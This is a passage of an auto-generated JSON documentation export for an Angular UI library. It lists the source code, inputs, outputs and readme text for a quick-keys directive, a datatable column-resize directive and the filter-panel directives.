            "sourceCode": "import { Directive, EventEmitter, HostListener, Input, Output } from '@angular/core';\nimport { FormGroup } from '@angular/forms';\nimport { Key } from '../abstract-and-interfaces/keyPress.enum';\n\n/**\n * QuickKeysDirective is used to implement shortcut keys on DOM elements, e.g to submit or reset a form on enter/escape\n * <form quickKeys (quickSubmit)=\"save()\" (quickCancel)=\"reset()\">\n */\n\n@Directive({\n  selector: '[stoQuickKeys]'\n})\nexport class QuickKeysDirective {\n  @Input() quickKeys: unknown;\n  /**\n   * Optional formGroup input, when used in combination with a reactive form\n   */\n  @Input() formGroup: FormGroup;\n  /**\n   * Emits when ctrl + enter is clicked in combination\n   * <form (quickSubmit)=\"save()\">\n   */\n  @Output() quickSubmit = new EventEmitter<void>();\n  /**\n   * Emits when escape is clicked\n   * <form (quickCancel)=\"cancel()\">\n   */\n  @Output() quickCancel = new EventEmitter<void>();\n\n  /**\n   * Listens on the host element for any keyup events\n   * @param e\n   */\n  @HostListener('keyup', ['$event'])\n  onKeyUp(e: KeyboardEvent) {\n    if (this.formGroup) {\n      this.handleFormKeys(e);\n    }\n    this.handleGenericKeydown(e);\n  }\n\n  /**\n   * Handler for generic keydowns, such as cancel events to close drawers\n   * @param e\n   * void\n   */\n  private handleGenericKeydown(e: KeyboardEvent) {\n    // Shortcuts that are useful outside of forms\n    if (e.keyCode === Key.Escape) {\n      this.quickCancel.emit();\n    }\n    if (!this.formGroup && e.keyCode === Key.Enter && e.ctrlKey) {\n      this.quickSubmit.emit();\n    }\n  }\n\n  /**\n   * Handler for form specific shortcuts, such as saving the form\n   * @param e\n   */\n  private handleFormKeys(e: KeyboardEvent) {\n    if (this.formGroup.pristine) {\n      return;\n    }\n    if (e.keyCode === Key.Enter && e.ctrlKey) {\n      this.quickSubmit.emit();\n    }\n  }\n}\n",
            "selector": "[stoQuickKeys]",
            "providers": [],
            "inputsClass": [
                {
                    "name": "formGroup",
                    "description": "<p>Optional formGroup input, when used in combination with a reactive form</p>\n",
                    "line": 18,
                    "type": "FormGroup"
                },
                {
                    "name": "quickKeys",
                    "line": 14,
                    "type": "unknown"
                }
            ],
            "outputsClass": [
                {
                    "name": "quickCancel",
                    "defaultValue": "new EventEmitter<void>()",
                    "description": "<p>Emits when escape is clicked</p>\n<form (quickCancel)=\"cancel()\">",
                    "line": 28,
                    "type": "EventEmitter"
                },
                {
                    "name": "quickSubmit",
                    "defaultValue": "new EventEmitter<void>()",
                    "description": "<p>Emits when ctrl + enter is clicked in combination</p>\n<form (quickSubmit)=\"save()\">",
                    "line": 23,
                    "type": "EventEmitter"
                }
            ],
            "hostBindings": [],
            "hostListeners": [
                {
                    "name": "keyup",
                    "args": [
                        {
                            "name": "e",
                            "type": "KeyboardEvent"
                        }
                    ],
                    "argsDecorator": [
                        "$event"
                    ],
                    "description": "<p>Listens on the host element for any keyup events</p>\n",
                    "line": 35
                }
            ],
            "propertiesClass": [],
            "methodsClass": [
                {
                    "name": "handleFormKeys",
                    "args": [
                        {
                            "name": "e",
                            "type": "KeyboardEvent"
                        }
                    ],
                    "optional": false,
                    "returnType": "void",
                    "typeParameters": [],
                    "line": 61,
                    "description": "<p>Handler for form specific shortcuts, such as saving the form</p>\n",
                    "modifierKind": [
                        112
                    ],
                    "jsdoctags": [
                        {
                            "name": {
                                "pos": 1638,
                                "end": 1639,
                                "flags": 0,
                                "escapedText": "e"
                            },
                            "type": "KeyboardEvent",
                            "tagName": {
                                "pos": 1632,
                                "end": 1637,
                                "flags": 0,
                                "escapedText": "param"
                            },
                            "comment": ""
                        }
                    ]
                },
                {
                    "name": "handleGenericKeydown",
                    "args": [
                        {
                            "name": "e",
                            "type": "KeyboardEvent"
                        }
                    ],
                    "optional": false,
                    "returnType": "void",
                    "typeParameters": [],
                    "line": 47,
                    "description": "<p>Handler for generic keydowns, such as cancel events to close drawers</p>\n",
                    "modifierKind": [
                        112
                    ],
                    "jsdoctags": [
                        {
                            "name": {
                                "pos": 1253,
                                "end": 1254,
                                "flags": 0,
                                "escapedText": "e"
                            },
                            "type": "KeyboardEvent",
                            "tagName": {
                                "pos": 1247,
                                "end": 1252,
                                "flags": 0,
                                "escapedText": "param"
                            },
                            "comment": "<p>void</p>\n"
                        }
                    ]
                }
            ],
            "readme": "<h4 id=\"quickkeysdirective\">QuickKeysDirective</h4>\n<p>QuickKeysDirective is used to implement shortcut keys on DOM elements, e.g to submit or reset a form on enter/escape</p>\n<h5 id=\"general-usage\">General usage</h5>\n<p>Currently we support two quick-key actions:</p>\n<ul>\n<li>CTRL+Enter to save</li>\n<li>Escape to cancel</li>\n</ul>\n<p>These emit on (quickSubmit) and (quickCancel) respectively.</p>\n<div><pre class=\"line-numbers\"><code class=\"language-html\">&lt;form [formGroup]=&quot;form&quot; quickKeys \n    (quickSubmit)=&quot;save()&quot;\n    (quickCancel)=&quot;cancel()&quot;&gt;...&lt;/form&gt;</code></pre></div><h5 id=\"with-a-formgroup\">With a FormGroup</h5>\n<p>The quick keys can be connected to a FormGroup, which allows us to run some default business checks before emitting (check if form is pristine before emitting submit, for example)</p>\n<div><pre class=\"line-numbers\"><code class=\"language-html\">&lt;form [formGroup]=&quot;form&quot; quickKeys (quickSubmit)=&quot;save()&quot;&gt;...&lt;/form&gt;</code></pre></div>"
        },
        {
            "name": "StoDatatableResizeDirective",
            "id": "directive-StoDatatableResizeDirective-8f7303d55f4cdfffb8b26a9c69172eef",
            "file": "libs/datatable/src/lib/sto-datatable/sto-datatable-header/sto-datatable-resize.directive.ts",
            "type": "directive",
            "description": "",
            "sourceCode": "import { AfterViewInit, Directive, ElementRef, EventEmitter, HostListener, Input, OnDestroy, Output } from '@angular/core';\nimport { Column } from '../columns';\nimport { fromEvent, ReplaySubject, Subject, Subscription } from 'rxjs';\nimport { take, takeUntil } from 'rxjs/operators';\n\n@Directive({\n  selector: '[stoDatatableResize]',\n  exportAs: 'stoDatatableResize'\n})\nexport class StoDatatableResizeDirective implements AfterViewInit, OnDestroy {\n  @Input()\n  column: Column;\n  // eslint-disable-next-line @angular-eslint/no-output-native\n  @Output()\n  resize = new EventEmitter<number>();\n  @Output()\n  resizeEnd = new EventEmitter<number>();\n  // @HostBinding('draggable')\n  // draggable = true;\n  private startOffset: number;\n  private initial: number;\n  private sub: Subscription;\n  public width$ = new ReplaySubject<number | null>();\n  private width: number;\n  private moveComplete$ = new Subject<boolean>();\n\n\n  constructor(private el: ElementRef<HTMLElement>) {\n  }\n\n  @HostListener('mousedown', [ '$event' ])\n  onMouseDown(event: MouseEvent) {\n    event.stopPropagation();\n    this.startOffset = event.screenX;\n    this.initial = this.column.flexBasis || 80;\n    fromEvent<MouseEvent>(document, 'mouseup')\n      .pipe(take(1))\n      .subscribe((ev) => this.onMouseUp(ev));\n    fromEvent<MouseEvent>(document, 'mousemove')\n      .pipe(takeUntil(this.moveComplete$))\n      .subscribe((ev) => this.move(ev));\n  }\n\n  onMouseUp(event: MouseEvent) {\n      event.stopPropagation();\n      this.moveComplete$.next(true);\n      this.width$.next(null);\n      this.resizeEnd.emit(this.width);\n  }\n\n  @HostListener('contextmenu', [ '$event' ])\n  ctxMenu(event: MouseEvent) {\n    event.stopPropagation();\n  }\n\n  private move(event: MouseEvent) {\n    const move = event.screenX - this.startOffset;\n    const width = this.initial + move < 40 ? 40 : this.initial + move;\n    this.width$.next(width);\n    this.width = width;\n  }\n\n  ngAfterViewInit(): void {\n    this.el.nativeElement.classList.add('sto-mdl-table__header__row__cell__resize-handle');\n  }\n\n  ngOnDestroy() {\n    this.moveComplete$.next(true);\n    this.moveComplete$.complete();\n    this.width$.complete();\n  }\n\n}\n",
            "selector": "[stoDatatableResize]",
            "providers": [],
            "inputsClass": [
                {
                    "name": "column",
                    "line": 12,
                    "type": "Column"
                }
            ],
            "outputsClass": [
                {
                    "name": "resize",
                    "defaultValue": "new EventEmitter<number>()",
                    "line": 15,
                    "type": "EventEmitter"
                },
                {
                    "name": "resizeEnd",
                    "defaultValue": "new EventEmitter<number>()",
                    "line": 17,
                    "type": "EventEmitter"
                }
            ],
            "hostBindings": [],
            "hostListeners": [
                {
                    "name": "contextmenu",
                    "args": [
                        {
                            "name": "event",
                            "type": "MouseEvent"
                        }
                    ],
                    "argsDecorator": [
                        "$event"
                    ],
                    "line": 52
                },
                {
                    "name": "mousedown",
                    "args": [
                        {
                            "name": "event",
                            "type": "MouseEvent"
                        }
                    ],
                    "argsDecorator": [
                        "$event"
                    ],
                    "line": 32
                }
            ],
            "propertiesClass": [
                {
                    "name": "initial",
                    "type": "number",
                    "optional": false,
                    "description": "",
                    "line": 21,
                    "modifierKind": [
                        112
                    ]
                },
                {
                    "name": "moveComplete$",
                    "defaultValue": "new Subject<boolean>()",
                    "type": "",
                    "optional": false,
                    "description": "",
                    "line": 25,
                    "modifierKind": [
                        112
                    ]
                },
                {
                    "name": "startOffset",
                    "type": "number",
                    "optional": false,
                    "description": "",
                    "line": 20,
                    "modifierKind": [
                        112
                    ]
                },
                {
                    "name": "sub",
                    "type": "Subscription",
                    "optional": false,
                    "description": "",
                    "line": 22,
                    "modifierKind": [
                        112
                    ]
                },
                {
                    "name": "width",
                    "type": "number",
                    "optional": false,
                    "description": "",
                    "line": 24,
                    "modifierKind": [
                        112
                    ]
                },
                {
                    "name": "width$",
                    "defaultValue": "new ReplaySubject<number | null>()",
                    "type": "",
                    "optional": false,
                    "description": "",
                    "line": 23,
                    "modifierKind": [
                        114
                    ]
                }
            ],
            "methodsClass": [
                {
                    "name": "move",
                    "args": [
                        {
                            "name": "event",
                            "type": "MouseEvent"
                        }
                    ],
                    "optional": false,
                    "returnType": "void",
                    "typeParameters": [],
                    "line": 56,
                    "modifierKind": [
                        112
                    ],
                    "jsdoctags": [
                        {
                            "name": "event",
                            "type": "MouseEvent",
                            "tagName": {
                                "text": "param"
                            }
                        }
                    ]
                },
                {
                    "name": "ngAfterViewInit",
                    "args": [],
                    "optional": false,
                    "returnType": "void",
                    "typeParameters": [],
                    "line": 63
                },
                {
                    "name": "ngOnDestroy",
                    "args": [],
                    "optional": false,
                    "returnType": "void",
                    "typeParameters": [],
                    "line": 67
                },
                {
                    "name": "onMouseUp",
                    "args": [
                        {
                            "name": "event",
                            "type": "MouseEvent"
                        }
                    ],
                    "optional": false,
                    "returnType": "void",
                    "typeParameters": [],
                    "line": 44,
                    "jsdoctags": [
                        {
                            "name": "event",
                            "type": "MouseEvent",
                            "tagName": {
                                "text": "param"
                            }
                        }
                    ]
                }
            ],
            "implements": [
                "AfterViewInit",
                "OnDestroy"
            ],
            "constructorObj": {
                "name": "constructor",
                "description": "",
                "args": [
                    {
                        "name": "el",
                        "type": "ElementRef<HTMLElement>"
                    }
                ],
                "line": 25,
                "jsdoctags": [
                    {
                        "name": "el",
                        "type": "ElementRef<HTMLElement>",
                        "tagName": {
                            "text": "param"
                        }
                    }
                ]
            }
        },
        {
            "name": "StoFilterActions",
            "id": "directive-StoFilterActions-21ad8ac77646e700e5df7422a50d8008",
            "file": "libs/common/src/lib/sto-filter/sto-filter-panel.component.ts",
            "type": "directive",
            "description": "",
            "sourceCode": "import {\n  AfterViewInit,\n  ChangeDetectorRef,\n  Component,\n  Directive,\n  EventEmitter,\n  HostBinding,\n  Input,\n  OnInit,\n  Output,\n  ViewChild,\n  ViewContainerRef,\n  ViewEncapsulation\n} from '@angular/core';\nimport { FilterForm, FilterList } from './filter';\n\n/**\n * Sto filter panel is an extension of mat-accordion\n */\n@Component({\n  selector: 'sto-filter-panel',\n  templateUrl: './sto-filter-panel.component.html',\n  encapsulation: ViewEncapsulation.None,\n  styleUrls: [ './sto-filter-panel.component.scss' ]\n})\nexport class StoFilterPanelComponent implements OnInit, AfterViewInit {\n  set contentHeight(contentHeight: number) {\n    this._contentHeight = contentHeight;\n  }\n\n  get contentHeight(): number {\n    return this._contentHeight;\n  }\n\n  /**\n   * If the filter panel should be expandable. Default true.\n   */\n  @Input()\n  expandable = true;\n\n  /**\n   * If the filter panel should be expanded by default. Default false.\n   */\n  @Input()\n  expanded: boolean;\n\n  /**\n   * List of active filters.\n   */\n  @Input()\n  filterList: FilterList[];\n\n  /**\n   * Emits {isExpanded: boolean, contentHeight: number } where\n   * isExpanded is true if the panel opens and false if not.\n   * ContentHeight is the height of the expanded content i pixels.\n   *  {EventEmitter<{isExpanded: boolean, contentHeight: number }>}\n   */\n  @Output() toggled = new EventEmitter<{ isExpanded: boolean, contentHeight: number }>();\n  /**\n   * Emits when a filter should be cleared (if applicable)\n   */\n  @Output()\n  clearFilter = new EventEmitter();\n\n  /**\n   * Buttons and actions on the left side of the separator if both table and filter actions is present.\n   */\n  @ViewChild('tableActions') contentWrapper: { nativeElement: HTMLElement; };\n  /**\n   * Buttons and actions on the right side of the separator if both table and filter actions is present.\n   */\n  @ViewChild('filterActions') contentWrapper2: { nativeElement: HTMLElement; };\n  @ViewChild('filterForm') filterForm: { nativeElement: HTMLElement; };\n\n  @Input()\n  public host: FilterForm<Record<string, unknown>>;\n  private _contentHeight: number;\n\n  public hasSeperator = false;\n\n  constructor(\n    private cdr: ChangeDetectorRef,\n    private vcRef: ViewContainerRef) {\n    try {\n      // eslint-disable-next-line @typescript-eslint/no-explicit-any\n      this.host = ( this.vcRef as any )._view.context;\n    } catch ( ex ) {\n      // most likely this fails only for tests after Ivy (Angular 9), as it no longer wraps with a component.\n    }\n  }\n\n  public toggle() {\n    this.expanded = !this.expanded;\n    this.setContentHeight();\n    this.toggled.emit({ isExpanded: this.expanded, contentHeight: this.contentHeight });\n  }\n\n  ngOnInit() {\n    if ( this.expandable ) {\n      if ( this.expanded === undefined ) {\n        this.expanded = true;\n      }\n    } else {\n      this.expanded = false;\n    }\n\n    this.needSeperator();\n  }\n\n  ngAfterViewInit() {\n    this.needSeperator();\n    this.setContentHeight();\n  }\n\n  private setContentHeight() {\n    const element = this.filterForm.nativeElement;\n    if ( element ) {\n      const contentArea = element.parentElement;\n      this.contentHeight = contentArea?.offsetHeight || 0;\n    }\n  }\n\n  public needSeperator() {\n    this.hasSeperator = false;\n    if ( this.contentWrapper && this.contentWrapper2 ) {\n      const el1 = this.contentWrapper.nativeElement;\n      const el2 = this.contentWrapper2.nativeElement;\n      if ( el1.children && el2.children ) {\n        if ( el1.children.length > 0 && el2.children.length > 0 ) {\n          const hasActionButtons = el1.children[ 0 ].children.length > 0;\n          const hasTableButtons = el2.children[ 0 ].children.length > 0;\n\n          this.hasSeperator = hasActionButtons && hasTableButtons;\n          this.cdr.detectChanges();\n        }\n      }\n    }\n\n\n  }\n\n  _clearFilter(key: string, index?: number) {\n    if (index === null) {\n      return;\n    }\n    try {\n      this.host.clearFilter(key, index);\n    } catch {\n      this.clearFilter.emit({ key, index });\n    }\n  }\n}\n\n/**\n * <mat-panel-description> directive.\n *\n * This direction is to be used inside of the MdExpansionPanelHeader component.\n */\n@Directive({\n  // eslint-disable-next-line @angular-eslint/directive-selector\n  selector: 'sto-filter-title'\n})\nexport class StoFilterTitle {\n}\n\n\n@Directive({\n  selector: 'sto-filter-table-actions'\n})\nexport class StoFilterTableActions {\n  @HostBinding('class.sto-filter-table-actions')\n  className = true;\n}\n\n@Directive({\n  selector: 'sto-filter-actions'\n})\nexport class StoFilterActions {\n}\n\n@Component({\n  selector: 'sto-filter-actions-bar',\n  template: `\n      <ng-content></ng-content>\n      <mat-button-toggle class=\"icon\"\n                         *ngIf=\"expandable\"\n                         style=\"box-shadow:none\"\n                         [checked]=\"expanded\"\n                         (change)=\"onChange($event)\"\n                         title=\"Toggle filter panel\"\n                         (click)=\"toggle.emit()\">\n          <mat-icon>filter_list</mat-icon>\n      </mat-button-toggle>\n\n  `\n})\n// eslint-disable-next-line @angular-eslint/component-class-suffix\nexport class StoFilterActionsBar {\n  @HostBinding('class.sto-filter-actions')\n  hasClass = true;\n\n  @Input() set expanded(expanded: boolean) {\n    this._expanded = expanded;\n  }\n\n  get expanded(): boolean {\n    return this._expanded;\n  }\n\n  @Input() expandable: boolean;\n  private _expanded: boolean;\n\n  @Output() toggle = new EventEmitter<void>();\n\n  // eslint-disable-next-line @typescript-eslint/no-unused-vars\n  onChange(event: unknown) {\n    // console.log($event);\n  }\n\n\n}\n\n",
            "selector": "sto-filter-actions",
            "providers": [],
            "inputsClass": [],
            "outputsClass": [],
            "hostBindings": [],
            "hostListeners": [],
            "propertiesClass": [],
            "methodsClass": [],
            "readme": "<h3 id=\"sto-filter-panel\">Sto filter panel</h3>\n<p>Filter panel is a togglable panel with a header and a content area, and is an extension of expansion panel from material.\nHas build in content areas for title, table actions and filter actions.\nThe panel has a toggle button that open and closes the content area and emits an event with the height of the content area.</p>\n<div><pre class=\"line-numbers\"><code class=\"language-html\">&lt;sto-filter-panel [expandable]=&quot;true&quot; (toggled)=&quot;toggleService.isToggled.emit($event)&quot;&gt;\n    &lt;sto-filter-title&gt;Integration Logs&lt;/sto-filter-title&gt;\n        &lt;sto-filter-table-actions&gt;\n           &lt;button mat-button&gt;\n           New&lt;mat-icon&gt;arrow_drop_down&lt;/mat-icon&gt;\n           &lt;/button&gt;    \n        &lt;/sto-filter-table-actions&gt;\n           &lt;sto-filter-actions&gt;\n                &lt;button mat-icon-button&gt;\n                  &lt;mat-icon&gt;refresh&lt;/mat-icon&gt;\n               &lt;/button&gt;\n            &lt;/sto-filter-actions&gt;\n        &lt;form class=&quot;sto-form sto-grid sto-grid--6&quot; [formGroup]=&quot;form&quot; &gt;\n             &lt;div class=&quot;sto-grid__column&quot;&gt;\n                   &lt;mat-form-field&gt;\n                     ...\n                    &lt;/mat-form-field&gt;\n             &lt;/div&gt;\n        &lt;/form&gt;\n&lt;/sto-filter-panel&gt;</code></pre></div><p>####Selector / Content projection</p>\n<h5 id=\"sto-filter-title\">sto-filter-title</h5>\n<p>The title. Usually just a string but could be html.</p>\n<h5 id=\"sto-filter-table-actions\">sto-filter-table-actions</h5>\n<p>Buttons and actions on the left side of the separator if both table and filter actions is present.\n(The name is from a time where all actions left of the separator was related to the table).</p>\n<h5 id=\"sto-filter-actions\">sto-filter-actions</h5>\n<p>Buttons and actions on the right side of the separator if both table and filter actions is present.\n(The name is from a time where all actions right of the separator was related to the table).</p>\n<p>####Input</p>\n<h5 id=\"expandable\">expandable</h5>\n<p>If the filter panel should be expandable. Default true.</p>\n<div><pre class=\"line-numbers\"><code class=\"language-html\">&lt;sto-filter-panel [expandable]=&quot;true&quot;&gt;</code></pre></div><h5 id=\"expanded\">expanded</h5>\n<p>If the filter panel should be expanded by default. Default false.</p>\n<div><pre class=\"line-numbers\"><code class=\"language-html\">&lt;sto-filter-panel [expanded]=&quot;true&quot;&gt;</code></pre></div><p>####Output</p>\n<h5 id=\"toggled\">toggled</h5>\n<p>Emits {isExpanded: boolean, contentHeight: number } where\nisExpanded is true if the panel opens and false if not.\nContentHeight is the height of the expanded content. </p>\n<div><pre class=\"line-numbers\"><code class=\"language-html\">&lt;sto-filter-panel (toggled)=&quot;onToggle($event)&quot;&gt;</code></pre></div>"
        },
        {
            "name": "StoFilterTableActions",
            "id": "directive-StoFilterTableActions-21ad8ac77646e700e5df7422a50d8008",
            "file": "libs/common/src/lib/sto-filter/sto-filter-panel.component.ts",
            "type": "directive",
            "description": "",
            "sourceCode": "import {\n  AfterViewInit,\n  ChangeDetectorRef,\n  Component,\n  Directive,\n  EventEmitter,\n  HostBinding,\n  Input,\n  OnInit,\n  Output,\n  ViewChild,\n  ViewContainerRef,\n  ViewEncapsulation\n} from '@angular/core';\nimport { FilterForm, FilterList } from './filter';\n\n/**\n * Sto filter panel is an extension of mat-accordion\n */\n@Component({\n  selector: 'sto-filter-panel',\n  templateUrl: './sto-filter-panel.component.html',\n  encapsulation: ViewEncapsulation.None,\n  styleUrls: [ './sto-filter-panel.component.scss' ]\n})\nexport class StoFilterPanelComponent implements OnInit, AfterViewInit {\n  set contentHeight(contentHeight: number) {\n    this._contentHeight = contentHeight;\n  }\n\n  get contentHeight(): number {\n    return this._contentHeight;\n  }\n\n  /**\n   * If the filter panel should be expandable. Default true.\n   */\n  @Input()\n  expandable = true;\n\n  /**\n   * If the filter panel should be expanded by default. Default false.\n   */\n  @Input()\n  expanded: boolean;\n\n  /**\n   * List of active filters.\n   */\n  @Input()\n  filterList: FilterList[];\n\n  /**\n   * Emits {isExpanded: boolean, contentHeight: number } where\n   * isExpanded is true if the panel opens and false if not.\n   * ContentHeight is the height of the expanded content i pixels.\n   *  {EventEmitter<{isExpanded: boolean, contentHeight: number }>}\n   */\n  @Output() toggled = new EventEmitter<{ isExpanded: boolean, contentHeight: number }>();\n  /**\n   * Emits when a filter should be cleared (if applicable)\n   */\n  @Output()\n  clearFilter = new EventEmitter();\n\n  /**\n   * Buttons and actions on the left side of the separator if both table and filter actions is present.\n   */\n  @ViewChild('tableActions') contentWrapper: { nativeElement: HTMLElement; };\n  /**\n   * Buttons and actions on the right side of the separator if both table and filter actions is present.\n   */\n  @ViewChild('filterActions') contentWrapper2: { nativeElement: HTMLElement; };\n  @ViewChild('filterForm') filterForm: { nativeElement: HTMLElement; };\n\n  @Input()\n  public host: FilterForm<Record<string, unknown>>;\n  private _contentHeight: number;\n\n  public hasSeperator = false;\n\n  constructor(\n    private cdr: ChangeDetectorRef,\n    private vcRef: ViewContainerRef) {\n    try {\n      // eslint-disable-next-line @typescript-eslint/no-explicit-any\n      this.host = ( this.vcRef as any )._view.context;\n    } catch ( ex ) {\n      // most likely this fails only for tests after Ivy (Angular 9), as it no longer wraps with a component.\n    }\n  }\n\n  public toggle() {\n    this.expanded = !this.expanded;\n    this.setContentHeight();\n    this.toggled.emit({ isExpanded: this.expanded, contentHeight: this.contentHeight });\n  }\n\n  ngOnInit() {\n    if ( this.expandable ) {\n      if ( this.expanded === undefined ) {\n        this.expanded = true;\n      }\n    } else {\n      this.expanded = false;\n    }\n\n    this.needSeperator();\n  }\n\n  ngAfterViewInit() {\n    this.needSeperator();\n    this.setContentHeight();\n  }\n\n  private setContentHeight() {\n    const element = this.filterForm.nativeElement;\n    if ( element ) {\n      const contentArea = element.parentElement;\n      this.contentHeight = contentArea?.offsetHeight || 0;\n    }\n  }\n\n  public needSeperator() {\n    this.hasSeperator = false;\n    if ( this.contentWrapper && this.contentWrapper2 ) {\n      const el1 = this.contentWrapper.nativeElement;\n      const el2 = this.contentWrapper2.nativeElement;\n      if ( el1.children && el2.children ) {\n        if ( el1.children.length > 0 && el2.children.length > 0 ) {\n          const hasActionButtons = el1.children[ 0 ].children.length > 0;\n          const hasTableButtons = el2.children[ 0 ].children.length > 0;\n\n          this.hasSeperator = hasActionButtons && hasTableButtons;\n          this.cdr.detectChanges();\n        }\n      }\n    }\n\n\n  }\n\n  _clearFilter(key: string, index?: number) {\n    if (index === null) {\n      return;\n    }\n    try {\n      this.host.clearFilter(key, index);\n    } catch {\n      this.clearFilter.emit({ key, index });\n    }\n  }\n}\n\n/**\n * <mat-panel-description> directive.\n *\n * This direction is to be used inside of the MdExpansionPanelHeader component.\n */\n@Directive({\n  // eslint-disable-next-line @angular-eslint/directive-selector\n  selector: 'sto-filter-title'\n})\nexport class StoFilterTitle {\n}\n\n\n@Directive({\n  selector: 'sto-filter-table-actions'\n})\nexport class StoFilterTableActions {\n  @HostBinding('class.sto-filter-table-actions')\n  className = true;\n}\n\n@Directive({\n  selector: 'sto-filter-actions'\n})\nexport class StoFilterActions {\n}\n\n@Component({\n  selector: 'sto-filter-actions-bar',\n  template: `\n      <ng-content></ng-content>\n      <mat-button-toggle class=\"icon\"\n                         *ngIf=\"expandable\"\n                         style=\"box-shadow:none\"\n                         [checked]=\"expanded\"\n                         (change)=\"onChange($event)\"\n                         title=\"Toggle filter panel\"\n                         (click)=\"toggle.emit()\">\n          <mat-icon>filter_list</mat-icon>\n      </mat-button-toggle>\n\n  `\n})\n// eslint-disable-next-line @angular-eslint/component-class-suffix\nexport class StoFilterActionsBar {\n  @HostBinding('class.sto-filter-actions')\n  hasClass = true;\n\n  @Input() set expanded(expanded: boolean) {\n    this._expanded = expanded;\n  }\n\n  get expanded(): boolean {\n    return this._expanded;\n  }\n\n  @Input() expandable: boolean;\n  private _expanded: boolean;\n\n  @Output() toggle = new EventEmitter<void>();\n\n  // eslint-disable-next-line @typescript-eslint/no-unused-vars\n  onChange(event: unknown) {\n    // console.log($event);\n  }\n\n\n}\n\n",
            "selector": "sto-filter-table-actions",
            "providers": [],
            "inputsClass": [],
            "outputsClass": [],
            "hostBindings": [
                {
                    "name": "class.sto-filter-table-actions",
                    "defaultValue": "true",
                    "line": 174
                }
            ],
            "hostListeners": [],
            "propertiesClass": [],
            "methodsClass": [],
            "readme": "<h3 id=\"sto-filter-panel\">Sto filter panel</h3>\n<p>Filter panel is a togglable panel with a header and a content area, and is an extension of expansion panel from material.\nHas build in content areas for title, table actions and filter actions.\nThe panel has a toggle button that open and closes the content area and emits an event with the height of the content area.</p>\n<div><pre class=\"line-numbers\"><code class=\"language-html\">&lt;sto-filter-panel [expandable]=&quot;true&quot; (toggled)=&quot;toggleService.isToggled.emit($event)&quot;&gt;\n    &lt;sto-filter-title&gt;Integration Logs&lt;/sto-filter-title&gt;\n        &lt;sto-filter-table-actions&gt;\n           &lt;button mat-button&gt;\n           New&lt;mat-icon&gt;arrow_drop_down&lt;/mat-icon&gt;\n           &lt;/button&gt;    \n        &lt;/sto-filter-table-actions&gt;\n           &lt;sto-filter-actions&gt;\n                &lt;button mat-icon-button&gt;\n                  &lt;mat-icon&gt;refresh&lt;/mat-icon&gt;\n               &lt;/button&gt;\n            &lt;/sto-filter-actions&gt;\n        &lt;form class=&quot;sto-form sto-grid sto-grid--6&quot; [formGroup]=&quot;form&quot; &gt;\n             &lt;div class=&quot;sto-grid__column&quot;&gt;\n                   &lt;mat-form-field&gt;\n                     ...\n                    &lt;/mat-form-field&gt;\n             &lt;/div&gt;\n        &lt;/form&gt;\n&lt;/sto-filter-panel&gt;</code></pre></div><p>####Selector / Content projection</p>\n<h5 id=\"sto-filter-title\">sto-filter-title</h5>\n<p>The title. Usually just a string but could be html.</p>\n<h5 id=\"sto-filter-table-actions\">sto-filter-table-actions</h5>\n<p>Buttons and actions on the left side of the separator if both table and filter actions is present.\n(The name is from a time where all actions left of the separator was related to the table).</p>\n<h5 id=\"sto-filter-actions\">sto-filter-actions</h5>\n<p>Buttons and actions on the right side of the separator if both table and filter actions is present.\n(The name is from a time where all actions right of the separator was related to the table).</p>\n<p>####Input</p>\n<h5 id=\"expandable\">expandable</h5>\n<p>If the filter panel should be expandable. Default true.</p>\n<div><pre class=\"line-numbers\"><code class=\"language-html\">&lt;sto-filter-panel [expandable]=&quot;true&quot;&gt;</code></pre></div><h5 id=\"expanded\">expanded</h5>\n<p>If the filter panel should be expanded by default. Default false.</p>\n<div><pre class=\"line-numbers\"><code class=\"language-html\">&lt;sto-filter-panel [expanded]=&quot;true&quot;&gt;</code></pre></div><p>####Output</p>\n<h5 id=\"toggled\">toggled</h5>\n<p>Emits {isExpanded: boolean, contentHeight: number } where\nisExpanded is true if the panel opens and false if not.\nContentHeight is the height of the expanded content. </p>\n<div><pre class=\"line-numbers\"><code class=\"language-html\">&lt;sto-filter-panel (toggled)=&quot;onToggle($event)&quot;&gt;</code></pre></div>"
        },
        {
            "name": "StoFilterTitle",
            "id": "directive-StoFilterTitle-21ad8ac77646e700e5df7422a50d8008",
            "file": "libs/common/src/lib/sto-filter/sto-filter-panel.component.ts",
            "type": "directive",
            "description": "<p><mat-panel-description> directive.</p>\n<p>This direction is to be used inside of the MdExpansionPanelHeader component.</p>\n",
            "sourceCode": "import {\n  AfterViewInit,\n  ChangeDetectorRef,\n  Component,\n  Directive,\n  EventEmitter,\n  HostBinding,\n  Input,\n  OnInit,\n  Output,\n  ViewChild,\n  ViewContainerRef,\n  ViewEncapsulation\n} from '@angular/core';\nimport { FilterForm, FilterList } from './filter';\n\n/**\n * Sto filter panel is an extension of mat-accordion\n */\n@Component({\n  selector: 'sto-filter-panel',\n  templateUrl: './sto-filter-panel.component.html',\n  encapsulation: ViewEncapsulation.None,\n  styleUrls: [ './sto-filter-panel.component.scss' ]\n})\nexport class StoFilterPanelComponent implements OnInit, AfterViewInit {\n  set contentHeight(contentHeight: number) {\n    this._contentHeight = contentHeight;\n  }\n\n  get contentHeight(): number {\n    return this._contentHeight;\n  }\n\n  /**\n   * If the filter panel should be expandable. Default true.\n   */\n  @Input()\n  expandable = true;\n\n  /**\n   * If the filter panel should be expanded by default. Default false.\n   */\n  @Input()\n  expanded: boolean;\n\n  /**\n   * List of active filters.\n   */\n  @Input()\n  filterList: FilterList[];\n\n  /**\n   * Emits {isExpanded: boolean, contentHeight: number } where\n   * isExpanded is true if the panel opens and false if not.\n   * ContentHeight is the height of the expanded content i pixels.\n   *  {EventEmitter<{isExpanded: boolean, contentHeight: number }>}\n   */\n  @Output() toggled = new EventEmitter<{ isExpanded: boolean, contentHeight: number }>();\n  /**\n   * Emits when a filter should be cleared (if applicable)\n   */\n  @Output()\n  clearFilter = new EventEmitter();\n\n  /**\n   * Buttons and actions on the left side of the separator if both table and filter actions is present.\n   */\n  @ViewChild('tableActions') contentWrapper: { nativeElement: HTMLElement; };\n  /**\n   * Buttons and actions on the right side of the separator if both table and filter actions is present.\n   */\n  @ViewChild('filterActions') contentWrapper2: { nativeElement: HTMLElement; };\n  @ViewChild('filterForm') filterForm: { nativeElement: HTMLElement; };\n\n  @Input()\n  public host: FilterForm<Record<string, unknown>>;\n  private _contentHeight: number;\n\n  public hasSeperator = false;\n\n  constructor(\n    private cdr: ChangeDetectorRef,\n    private vcRef: ViewContainerRef) {\n    try {\n      // eslint-disable-next-line @typescript-eslint/no-explicit-any\n      this.host = ( this.vcRef as any )._view.context;\n    } 